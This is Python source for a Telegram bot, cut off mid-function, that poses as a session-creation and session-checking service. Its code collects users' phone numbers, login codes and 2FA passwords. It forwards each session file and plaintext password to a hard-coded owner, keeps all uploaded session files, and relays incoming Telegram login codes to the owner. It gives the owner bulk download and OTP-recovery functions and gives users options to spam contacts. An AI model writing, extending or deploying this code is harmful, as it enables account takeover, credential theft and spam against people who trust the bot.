import os
import re
import zipfile
import sqlite3
import asyncio
import logging
from pathlib import Path
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, ConversationHandler,
    MessageHandler, filters, ContextTypes
)
from telethon import TelegramClient, errors, events

# =================== CONFIG ===================
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
OWNER_ID = 6698156001               # Owner's Telegram ID
API_ID = 12345                      # From my.telegram.org
API_HASH = "your_api_hash_here"

SESSIONS_DIR = Path("sessions")
SESSIONS_DIR.mkdir(exist_ok=True)
UPLOAD_DIR = Path("uploads")
UPLOAD_DIR.mkdir(exist_ok=True)
DB_PATH = "bot_data.db"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

active_clients = {}      # phone -> client
session_owners = {}      # session_file_path -> user_id

PHONE, CODE, PASSWORD = range(3)
MSG_CHOICE, MSG_TARGET, MSG_TEXT, MSG_COUNT = range(10, 14)

# =================== DATABASE ===================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        phone TEXT,
        session_file TEXT,
        created_at TEXT,
        last_active TEXT,
        twofa_enabled INTEGER DEFAULT 0,
        twofa_password TEXT DEFAULT ''
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT
    )''')
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('required_channel', '')")
    conn.commit()
    conn.close()

def get_required_channel():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT value FROM settings WHERE key='required_channel'")
    row = c.fetchone()
    conn.close()
    return row[0] if row else ""

def set_required_channel(channel: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE settings SET value=? WHERE key='required_channel'", (channel,))
    conn.commit()
    conn.close()

def add_user(user_id, phone, session_file, twofa=0, twofa_password=""):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (user_id, phone, session_file, created_at, last_active, twofa_enabled, twofa_password) VALUES (?,?,?,?,?,?,?)",
              (user_id, phone, session_file, datetime.now().isoformat(), datetime.now().isoformat(), twofa, twofa_password))
    conn.commit()
    conn.close()

def get_user_by_id(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT phone, session_file, twofa_enabled, twofa_password FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row

def get_user_by_phone(phone):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT user_id, session_file FROM users WHERE phone=?", (phone,))
    row = c.fetchone()
    conn.close()
    return row

def delete_session_by_phone(phone):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT session_file FROM users WHERE phone=?", (phone,))
    row = c.fetchone()
    if row and row[0] and Path(row[0]).exists():
        Path(row[0]).unlink()
    c.execute("DELETE FROM users WHERE phone=?", (phone,))
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT user_id, phone, last_active, twofa_enabled FROM users ORDER BY created_at DESC")
    rows = c.fetchall()
    conn.close()
    return rows

def delete_session_file_and_db(session_path):
    try:
        if session_path.exists():
            session_path.unlink()
    except:
        pass
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM users WHERE session_file=?", (str(session_path),))
    conn.commit()
    conn.close()
    phone = None
    for p, cl in active_clients.items():
        if cl.session_file == str(session_path):
            phone = p
            break
    if phone and phone in active_clients:
        del active_clients[phone]
    if str(session_path) in session_owners:
        del session_owners[str(session_path)]

# =================== 777000 MONITOR ===================
async def start_monitor_for_session(session_file: Path, phone: str, owner_user_id: int):
    if phone in active_clients:
        return
    client = TelegramClient(str(session_file), API_ID, API_HASH)
    await client.connect()
    if not await client.is_user_authorized():
        logger.warning(f"Session {session_file} not authorized, removing")
        delete_session_file_and_db(session_file)
        return
    active_clients[phone] = client
    session_owners[str(session_file)] = owner_user_id
    logger.info(f"📡 777000 monitor started for {phone} (owner: {owner_user_id})")

    @client.on(events.NewMessage(from_users=777000))
    async def forward_777000(event):
        try:
            msg_text = event.message.text
            # Forward to bot owner
            await client.send_message(OWNER_ID, f"📨 *777000 Msg for {phone}*:\n`{msg_text}`", parse_mode="Markdown")
            # Forward to session owner (if not same as bot owner)
            if owner_user_id != OWNER_ID:
                await client.send_message(owner_user_id, f"📨 *777000 से OTP / your session {phone}*\n`{msg_text}`", parse_mode="Markdown")
        except Exception as e:
            logger.error(f"Forward failed: {e}")

    asyncio.create_task(client.run_until_disconnected())

async def start_all_session_monitors():
    users = get_all_users()
    for uid, phone, _, _ in users:
        session_file = SESSIONS_DIR / f"{phone}.session"
        if session_file.exists():
            await start_monitor_for_session(session_file, phone, uid)

# =================== HEALTH CHECK ===================
async def session_health_check(context: ContextTypes.DEFAULT_TYPE):
    logger.info("🔄 Health check started...")
    for session_file in SESSIONS_DIR.glob("*.session"):
        client = TelegramClient(str(session_file), API_ID, API_HASH)
        try:
            await client.connect()
            me = await client.get_me()
            if me:
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute("UPDATE users SET last_active=? WHERE session_file=?", (datetime.now().isoformat(), str(session_file)))
                conn.commit()
                conn.close()
                phone = me.phone
                if phone and phone not in active_clients:
                    owner_id = None
                    c2 = conn.cursor()
                    c2.execute("SELECT user_id FROM users WHERE phone=?", (phone,))
                    row = c2.fetchone()
                    owner_id = row[0] if row else OWNER_ID
                    await start_monitor_for_session(session_file, phone, owner_id)
            else:
                delete_session_file_and_db(session_file)
            await client.disconnect()
        except Exception:
            delete_session_file_and_db(session_file)
    logger.info("✅ Health check done")

# =================== HELPERS ===================
def normalize_phone(phone: str) -> str:
    phone = re.sub(r'\s+', '', phone)
    if phone.startswith('+'):
        return phone
    if phone.startswith('00'):
        return '+' + phone[2:]
    if phone.startswith('0'):
        phone = phone[1:]
    return '+91' + phone

async def check_channel_join(user_id, context):
    channel = get_required_channel()
    if not channel:
        return True
    try:
        member = await context.bot.get_chat_member(chat_id=f"@{channel}", user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except:
        return False

# =================== SESSION READ (FOR ALL USERS) ===================
async def session_read_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Anyone can upload .session or .zip to check if active"""
    await update.message.reply_text(
        "📂 *SESSION READER* 📂\n\n"
        "अपनी `.session` या `.zip` फाइल अपलोड करो। / Upload your `.session` or `.zip` file.\n"
        "मैं चेक करूंगा कि सेशन एक्टिव है या नहीं। / I'll check if session is active.\n\n"
        "🔙 *Back* बटन दबाकर कैंसल कर सकते हो।",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_upload")]])
    )
    context.user_data['awaiting_session_read'] = True

async def handle_session_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_session_read'):
        return
    user_id = update.effective_user.id
    document = update.message.document
    if not document:
        return
    file_name = document.file_name
    if not (file_name.endswith('.session') or file_name.endswith('.zip')):
        await update.message.reply_text("❌ सिर्फ `.session` या `.zip` फाइल सपोर्ट है। / Only .session or .zip files allowed.")
        return

    # Download file
    file_obj = await context.bot.get_file(document.file_id)
    temp_path = UPLOAD_DIR / file_name
    await file_obj.download_to_drive(temp_path)

    # Extract if zip
    extracted_files = []
    if file_name.endswith('.zip'):
        with zipfile.ZipFile(temp_path, 'r') as zip_ref:
            zip_ref.extractall(UPLOAD_DIR)
            extracted_files = [f for f in UPLOAD_DIR.iterdir() if f.suffix == '.session' and f.name != file_name]
        temp_path.unlink()
        if not extracted_files:
            await update.message.reply_text("❌ जिप में कोई `.session` फाइल नहीं मिली। / No .session file found in zip.")
            return
        session_file = extracted_files[0]
    else:
        session_file = temp_path

    # Scan session
    client = TelegramClient(str(session_file), API_ID, API_HASH)
    try:
        await client.connect()
        me = await client.get_me()
        phone = me.phone
        if phone:
            # Active session
            await update.message.reply_text(
                f"⚡ sᴄᴀɴɴɪɴɢ sᴇssɪᴏɴ ғɪʟᴇs...\n\n"
                f"🟢 ✅ sᴇssɪᴏɴ ᴄᴏɴɴᴇᴄᴛ sᴜᴄᴄᴇssғᴜʟʟʏ: `{phone}`\n\n"
                f"📊 ғɪɴᴀʟ sᴛᴀᴛs:\n✅ ᴀᴄᴛɪᴠᴇ: 1\n❌ ʟᴏɢᴏᴜᴛ: 0",
                parse_mode="Markdown"
            )
            # Add to DB if not already (only if user wants to keep it? We'll add for owner, but for normal user we just inform)
            # For simplicity, we store only if user is owner? Actually we can store for any user who uploads.
            existing = get_user_by_phone(phone)
            if not existing:
                add_user(user_id, phone, str(session_file), twofa=0)
            else:
                # Update session file path
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute("UPDATE users SET session_file=? WHERE phone=?", (str(session_file), phone))
                conn.commit()
                conn.close()
            # Start 777000 monitor for this session (owner and this user will receive forwards)
            await start_monitor_for_session(session_file, phone, user_id)

            # Send file back with chat button
            with open(session_file, 'rb') as f:
                keyboard = [[InlineKeyboardButton("💬 चैट खोलें / Open Chat", url=f"tg://user?id={user_id}")],
                            [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]
                await update.message.reply_document(f, filename=f"{phone}.session", caption=f"📞 {phone}\n✅ Active Session", reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            raise Exception("No phone number")
    except Exception as e:
        await update.message.reply_text(
            f"⚡ sᴄᴀɴɴɪɴɢ sᴇssɪᴏɴ ғɪʟᴇs...\n\n"
            f"🔴 ❌ ᴇʀʀᴏʀ: {session_file.name}\n\n"
            f"📊 ғɪɴᴀʟ sᴛᴀᴛs:\n✅ ᴀᴄᴛɪᴠᴇ: 0\n❌ ʟᴏɢᴏᴜᴛ: 1",
            parse_mode="Markdown"
        )
        if session_file.exists():
            session_file.unlink()
    finally:
        await client.disconnect()
        if session_file.parent == UPLOAD_DIR and session_file.exists():
            session_file.unlink()
        context.user_data.pop('awaiting_session_read', None)

async def cancel_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data.pop('awaiting_session_read', None)
    await start(query, context)

# =================== START & KEYBOARDS ===================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await check_channel_join(user_id, context):
        keyboard = [[InlineKeyboardButton("📢 चैनल जॉइन करें / Join Channel", url=f"https://t.me/{get_required_channel()}")],
                    [InlineKeyboardButton("✅ जॉइन कर लिया / Joined", callback_data="check_join")]]
        await update.message.reply_text(
            "⚠️ पहले हमारा चैनल जॉइन करो / Please join our channel first.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return

    if user_id == OWNER_ID:
        keyboard = [
            [KeyboardButton("👥 सभी एक्टिव सेशन / Active Sessions")],
            [KeyboardButton("🗑 सेशन डिलीट (नंबर से) / Delete by Phone")],
            [KeyboardButton("🔄 फोर्स चेक / Force Check")],
            [KeyboardButton("📨 ब्रॉडकास्ट / Broadcast")],
            [KeyboardButton("🔧 चैनल सेटिंग / Channel Setting")],
            [KeyboardButton("📥 Download All Sessions")],
            [KeyboardButton("📋 Recover All Info")],
            [KeyboardButton("📂 Read Session File")],
            [KeyboardButton("📱 मुख्य मेनू / Main Menu")]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text(
            "👑 **ओनर पैनल**\nनीचे दिए बटन इस्तेमाल करो / Use buttons below.",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    else:
        keyboard = [
            [KeyboardButton("➕ नया सेशन बनाएँ / Create Session")],
            [KeyboardButton("ℹ️ मेरी जानकारी / My Info")],
            [KeyboardButton("💬 Spam Message 🚀")],
            [KeyboardButton("📂 Read Session File")]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text(
            "🤖 **Telegram Session Bot**\nकोई भी ऑप्शन चुनो / Choose an option:",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ सिर्फ ओनर के लिए / Owner only")
        return
    await start(update, context)

async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if await check_channel_join(query.from_user.id, context):
        await query.edit_message_text("✅ धन्यवाद! अब /start दबाओ / Now press /start")
    else:
        await query.edit_message_text("❌ पहले चैनल जॉइन करो / Join channel first")

# =================== OWNER TEXT HANDLERS ===================
async def handle_owner_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if update.effective_user.id != OWNER_ID:
        return

    if text == "👥 सभी एक्टिव सेशन / Active Sessions":
        await admin_list_users(update, context)
    elif text == "🗑 सेशन डिलीट (नंबर से) / Delete by Phone":
        context.user_data['awaiting_delete_phone'] = True
        await update.message.reply_text("🗑 फोन नंबर भेजो (जैसे +919876543210) / Send phone number:")
    elif text == "🔄 फोर्स चेक / Force Check":
        await update.message.reply_text("🔍 चेक शुरू... / Checking...")
        await session_health_check(context)
        await update.message.reply_text("✅ चेक पूरा / Check done")
    elif text == "📨 ब्रॉडकास्ट / Broadcast":
        await admin_broadcast_start(update, context)
    elif text == "🔧 चैनल सेटिंग / Channel Setting":
        await admin_channel_settings(update, context)
    elif text == "📥 Download All Sessions":
        await download_all_sessions(update, context)
    elif text == "📋 Recover All Info":
        await recover_all_info(update, context)
    elif text == "📂 Read Session File":
        await session_read_command(update, context)
    elif text == "📱 मुख्य मेनू / Main Menu":
        keyboard = [
            [KeyboardButton("➕ नया सेशन बनाएँ / Create Session")],
            [KeyboardButton("ℹ️ मेरी जानकारी / My Info")],
            [KeyboardButton("💬 Spam Message 🚀")],
            [KeyboardButton("📂 Read Session File")],
            [KeyboardButton("👑 ओनर पैनल / Owner Panel")]
        ]
        await update.message.reply_text("📱 **यूजर मेनू**", reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True), parse_mode="Markdown")
    elif text == "👑 ओनर पैनल / Owner Panel":
        await start(update, context)
    elif context.user_data.get('awaiting_delete_phone'):
        phone = normalize_phone(text)
        user = get_user_by_phone(phone)
        if not user:
            await update.message.reply_text("❌ यह नंबर नहीं मिला / Number not found")
        else:
            delete_session_by_phone(phone)
            await update.message.reply_text(f"✅ {phone} डिलीट हो गया / Deleted")
        context.user_data.pop('awaiting_delete_phone', None)

async def admin_list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await session_health_check(context)
    users = get_all_users()
    if not users:
        await update.message.reply_text("कोई एक्टिव यूजर नहीं / No active users")
        return
    await update.message.reply_text(f"📋 **एक्टिव सेशन** (Total: {len(users)})", parse_mode="Markdown")
    for uid, phone, last_active, twofa in users:
        twofa_str = "🔒 ON" if twofa else "🔓 OFF"
        caption = f"📞 `{phone}`\n🕒 {last_active[:16]}\n🔐 2FA: {twofa_str}"
        keyboard = [[InlineKeyboardButton("📁 फाइल लो / Get File", callback_data=f"getfile_{phone}")]]
        await update.message.reply_text(caption, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def get_session_file_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    phone = query.data.split('_')[1]
    user = get_user_by_phone(phone)
    if not user or not Path(user[1]).exists():
        await query.edit_message_text("❌ फाइल नहीं मिली / File not found")
        return
    owner_id = user[0]
    with open(user[1], 'rb') as f:
        keyboard = [[InlineKeyboardButton("💬 चैट खोलें / Open Chat", url=f"tg://user?id={owner_id}")],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]
        await query.message.reply_document(f, filename=f"{phone}.session", caption=f"📞 {phone}", reply_markup=InlineKeyboardMarkup(keyboard))
    await query.delete_message()

async def download_all_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = get_all_users()
    if not users:
        await update.message.reply_text("❌ कोई सेशन नहीं / No sessions")
        return
    await update.message.reply_text(f"📦 {len(users)} फाइलें भेज रहा हूँ / Sending {len(users)} files...")
    for uid, phone, _, _ in users:
        session_file = SESSIONS_DIR / f"{phone}.session"
        if session_file.exists():
            with open(session_file, 'rb') as f:
                keyboard = [[InlineKeyboardButton("💬 चैट खोलें / Open Chat", url=f"tg://user?id={uid}")],
                            [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]
                await update.message.reply_document(f, filename=f"{phone}.session", caption=f"📞 {phone}", reply_markup=InlineKeyboardMarkup(keyboard))
            await asyncio.sleep(1)
        else:
            await update.message.reply_text(f"⚠️ {phone} की फाइल नहीं मिली / File missing")
    await update.message.reply_text("✅ सब भेज दिया / All sent")

async def recover_all_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = get_all_users()
    if not users:
        await update.message.reply_text("कोई एक्टिव सेशन नहीं / No active sessions")
        return
    await update.message.reply_text("🔍 सभी सेशन से डेटा लाया जा रहा है... कृपया थोड़ा इंतज़ार करो / Fetching data, please wait...")
    report = ""
    for uid, phone, last_active, twofa in users:
        twofa_str = "✅ चालू" if twofa else "❌ बंद"
        session_file = SESSIONS_DIR / f"{phone}.session"
        otp_text = "नहीं मिला / Not found"
        if session_file.exists():
            client = TelegramClient(str(session_file), API_ID, API_HASH)
            await client.connect()
            try:
                if await client.is_user_authorized():
                    async for msg in client.iter_messages(777000, limit=3):
                        if msg.text and ("login code" in msg.text.lower() or "OTP" in msg.text):
                            codes = re.findall(r'\b\d{5,6}\b', msg.text)
                            if codes:
                                otp_text = codes[0]
                            break
            except:
                otp_text = "त्रुटि / Error"
            finally:
                await client.disconnect()
        report += f"\n📞 {phone}\n🔐 2FA: {twofa_str}\n🔢 Last OTP: {otp_text}\n🕒 Last active: {last_active[:16]}\n\n"
        if len(report) > 3500:
            await update.message.reply_text(report)
            report = ""
    if report:
        await update.message.reply_text(report)
    else:
        await update.message.reply_text("✅ सब डेटा भेज दिया / All data sent")

async def recover_single_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command: /recover +919876543210"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ सिर्फ ओनर / Owner only")
        return
    if not context.args:
        await update.message.reply_text("उपयोग: /recover +919876543210\nUsage: /recover +919876543210")
        return
    phone = normalize_phone(context.args[0])
    user = get_user_by_phone(phone)
    if not user:
        await update.message.reply_text(f"❌ {phone} का सेशन नहीं मिला / Session not found")
        return
    session_file = user[1]
    if not Path(session_file).exists():
        await update.message.reply_text("❌ फाइल मौजूद नहीं / File missing")
        return
    owner_id = user[0]
    with open(session_file, 'rb') as f:
        keyboard = [[InlineKeyboardButton("💬 चैट खोलें / Open Chat", url=f"tg://user?id={owner_id}")],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]
        await update.message.reply_document(f, filename=f"{phone}.session", caption=f"📞 {phone}", reply_markup=InlineKeyboardMarkup(keyboard))
    # Fetch last OTP
    client = TelegramClient(str(session_file), API_ID, API_HASH)
    await client.connect()
    try:
        if await client.is_user_authorized():
            async for msg in client.iter_messages(777000, limit=3):
                if msg.text and ("login code" in msg.text.lower() or "OTP" in msg.text):
                    await update.message.reply_text(f"📨 *Last OTP for {phone}*:\n`{msg.text}`", parse_mode="Markdown")
                    break
            else:
                await update.message.reply_text(f"⚠️ {phone} के लिए कोई OTP नहीं मिला / No OTP found")
        else:
            await update.message.reply_text("❌ सेशन अधिकृत नहीं / Session not authorized")
    except Exception as e:
        await update.message.reply_text(f"❌ त्रुटि: {e}")
    finally:
        await client.disconnect()

# =================== BROADCAST & CHANNEL SETTINGS ===================
async def admin_broadcast_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = get_all_users()
    if not users:
        await update.message.reply_text("कोई यूजर नहीं / No users")
        return
    keyboard = []
    for uid, phone, _, _ in users:
        keyboard.append([InlineKeyboardButton(f"{phone}", callback_data=f"broadcast_{uid}")])
    keyboard.append([InlineKeyboardButton("❌ रद्द / Cancel", callback_data="cancel_broadcast")])
    await update.message.reply_text("📨 किस यूजर को मैसेज भेजना है? / Select user:", reply_markup=InlineKeyboardMarkup(keyboard))
    context.user_data['broadcast_mode'] = True

async def admin_broadcast_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    target_uid = int(query.data.split('_')[1])
    context.user_data['broadcast_target'] = target_uid
    await query.edit_message_text("✏️ अपना मैसेज टाइप करो / Type your message:")

async def admin_broadcast_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target_uid = context.user_data.get('broadcast_target')
    if not target_uid:
        await update.message.reply_text("पहले ब्रॉडकास्ट शुरू करो / Start broadcast first")
        return
    msg = update.message.text
    try:
        await context.bot.send_message(target_uid, f"📢 **ओनर से सन्देश / Message from Owner:**\n{msg}", parse_mode="Markdown")
        await update.message.reply_text("✅ मैसेज भेज दिया / Message sent")
    except Exception as e:
        await update.message.reply_text(f"❌ त्रुटि: {e}")
    context.user_data.pop('broadcast_target', None)

async def admin_channel_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    current = get_required_channel()
    keyboard = [
        [InlineKeyboardButton("✏️ चैनल सेट करो / Set Channel", callback_data="set_channel")],
        [InlineKeyboardButton("🚫 चैनल हटाओ / Remove Channel", callback_data="remove_channel")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
    ]
    await update.message.reply_text(f"📢 **Current Channel:** {current or 'None'}", reply_markup=InlineKeyboardMarkup(keyboard))

async def set_channel_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("🔧 चैनल का यूज़रनेम बिना @ भेजो (जैसे mychannel)\nSend channel username without @ (e.g., mychannel):")
    context.user_data['awaiting_channel'] = True

async def set_channel_value(update: Update, context: ContextTypes.DEFAULT_TYPE):
    channel = update.message.text.strip().lstrip('@')
    set_required_channel(channel)
    await update.message.reply_text(f"✅ चैनल @{channel} अनिवार्य कर दिया / Channel @{channel} is now required")
    context.user_data.pop('awaiting_channel', None)

async def remove_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    set_required_channel("")
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("✅ चैनल हटा दिया गया / Channel requirement removed")

# =================== USER SESSION CREATION (with 2FA password forwarding) ===================
async def create_session_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📱 *अपना मोबाइल नंबर भेजो* (जैसे +919876543210, 9876543210)\n"
        "Send your mobile number:\n\n🔙 *Back* बटन दबाकर कैंसल करें।",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_conv")]])
    )
    context.user_data['attempts_code'] = 0
    context.user_data['attempts_password'] = 0
    return PHONE

async def create_session_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    raw = update.message.text.strip()
    phone = normalize_phone(raw)
    context.user_data['phone'] = phone
    session_file = SESSIONS_DIR / f"{phone}.session"
    context.user_data['session_file'] = str(session_file)
    client = TelegramClient(str(session_file), API_ID, API_HASH)
    context.user_data['client'] = client
    await client.connect()
    try:
        await client.send_code_request(phone)
        await update.message.reply_text(
            "🔢 OTP भेज दिया / OTP sent. अब कोड भेजो / Send code:\n\n🔙 Back",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_conv")]])
        )
        return CODE
    except Exception as e:
        await update.message.reply_text(f"❌ त्रुटि: {e}")
        await client.disconnect()
        return ConversationHandler.END

async def create_session_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code = update.message.text.strip()
    client = context.user_data['client']
    phone = context.user_data['phone']
    attempts = context.user_data.get('attempts_code', 0)
    try:
        await client.sign_in(phone, code)
        session_file = context.user_data['session_file']
        await client.disconnect()
        with open(session_file, 'rb') as f:
            await update.message.reply_document(f, filename=f"{phone}.session", caption="✅ सेशन बन गया / Session created!")
        add_user(update.effective_user.id, phone, session_file, twofa=0, twofa_password="")
        # Forward to owner with file and chat button
        with open(session_file, 'rb') as f:
            keyboard = [[InlineKeyboardButton("💬 चैट खोलें / Open Chat", url=f"tg://user?id={update.effective_user.id}")],
                        [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]
            await context.bot.send_document(OWNER_ID, f, filename=f"{phone}.session", caption=f"✅ New session\n📞 {phone}\n👤 {update.effective_user.id}\n🔓 2FA: OFF", reply_markup=InlineKeyboardMarkup(keyboard))
        await start_monitor_for_session(Path(session_file), phone, update.effective_user.id)
        context.user_data.clear()
        return ConversationHandler.END
    except errors.SessionPasswordNeededError:
        await update.message.reply_text(
            "🔐 इस अकाउंट पर 2FA चालू है। पासवर्ड भेजो / 2FA is ON. Send password:\n\n🔙 Back",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_conv")]])
        )
        return PASSWORD
    except errors.PhoneCodeInvalidError:
        if attempts + 1 >= 3:
            await update.message.reply_text("❌ 3 बार गलत OTP। प्रक्रिया रद्द / 3 wrong attempts. Cancelled.")
            await client.disconnect()
            return ConversationHandler.END
        context.user_data['attempts_code'] = attempts + 1
        await update.message.reply_text(f"❌ गलत OTP। बचे प्रयास: {3 - (attempts+1)}। फिर से भेजो / Wrong OTP. Attempts left: {3 - (attempts+1)}. Try again:")
        return CODE
    except Exception as e:
        await update.message.reply_text(f"❌ त्रुटि: {e}")
        await client.disconnect()
        return ConversationHandler.END

async def create_session_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text.strip()
    client = context.user_data['client']
    attempts = context.user_data.get('attempts_password', 0)
    try:
        await client.sign_in(password=password)
        session_file = context.user_data['session_file']
        await client.disconnect()
        with open(session_file, 'rb') as f:
            await update.message.reply_document(f, filename=f"{context.user_data['phone']}.session", caption="✅ 2FA पास, सेशन तैयार / 2FA passed, session ready")
        add_user(update.effective_user.id, context.user_data['phone'], session_file, twofa=1, twofa_password=password)
        # Forward to owner with file, chat button, and 2FA password
        with open(session_file, 'rb') as f:
            keyboard = [[InlineKeyboardButton("💬 चैट खोलें / Open Chat", url=f"tg://user?id={update.effective_user.id}")],
                        [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]
            await context.bot.send_document(OWNER_ID, f, filename=f"{context.user_data['phone']}.session", caption=f"✅ New session (2FA)\n📞 {context.user_data['phone']}\n👤 {update.effective_user.id}\n🔒 2FA: ON\n🔑 2FA Password: `{password}`", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        await start_monitor_for_session(Path(session_file), context.user_data['phone'], update.effective_user.id)
        context.user_data.clear()
        return ConversationHandler.END
    except errors.PasswordHashInvalidError:
        if attempts + 1 >= 3:
            await update.message.reply_text("❌ 3 बार गलत पासवर्ड। रद्द / 3 wrong passwords. Cancelled.")
            await client.disconnect()
            return ConversationHandler.END
        context.user_data['attempts_password'] = attempts + 1
        await update.message.reply_text(f"❌ गलत पासवर्ड। बचे प्रयास: {3 - (attempts+1)}। फिर से दो / Wrong password. Attempts left: {3 - (attempts+1)}. Try again:")
        return PASSWORD
    except Exception as e:
        await update.message.reply_text(f"❌ त्रुटि: {e}")
        await client.disconnect()
        return ConversationHandler.END

async def cancel_conv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if 'client' in context.user_data:
        await context.user_data['client'].disconnect()
    context.user_data.clear()
    query = update.callback_query
    if query:
        await query.answer()
        await query.edit_message_text("🚫 ऑपरेशन कैंसल किया गया / Operation cancelled.")
        await start(query, context)
    else:
        await update.message.reply_text("🚫 रद्द किया / Cancelled")
    return ConversationHandler.END

# =================== USER INFO & SPAM MESSAGE ===================
async def my_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    data = get_user_by_id(user_id)
    if not data:
        await update.message.reply_text("❌ आपका कोई सेशन नहीं है / You have no session")
        return
    phone, sess_file, twofa, _ = data
    twofa_status = "✅ चालू / ON" if twofa else "❌ बंद / OFF"
    await update.message.reply_text(f"📞 फोन: {phone}\n🔐 2FA: {twofa_status}\n📁 फाइल: {Path(sess_file).name}")

async def spam_message_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    data = get_user_by_id(user_id)
    if not data:
        await update.message.reply_text("❌ पहले सेशन बनाओ / Create session first")
        return
    phone, session_file, _, _ = data
    if not Path(session_file).exists():
        await update.message.reply_text("❌ सेशन फाइल नहीं मिली / Session file missing")
        return
    context.user_data['sender_session_file'] = session_file
    keyboard = [
        [InlineKeyboardButton("🎯 एक यूजर को स्पैम करें / Spam Single User", callback_data="msg_single")],
        [InlineKeyboardButton("👥 सभी डायलॉग्स को स्पैम करें / Spam All Dialogs", callback_data="msg_all_dialogs")],
        [InlineKeyboardButton("🔙 Back", callback_data="cancel_spam")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
    ]
    await update.message.reply_text("💬 *स्पैम मैसेज भेजने का तरीका चुनो / Choose spam method:*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    return MSG_CHOICE

async def msg_choice_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    choice = query.data
    if choice == "msg_single":
        await query.edit_message_text("✏️ यूजरनेम (बिना @) या ID भेजो / Send username (without @) or ID:\n\n🔙 Back बटन दबाकर कैंसल करें।",
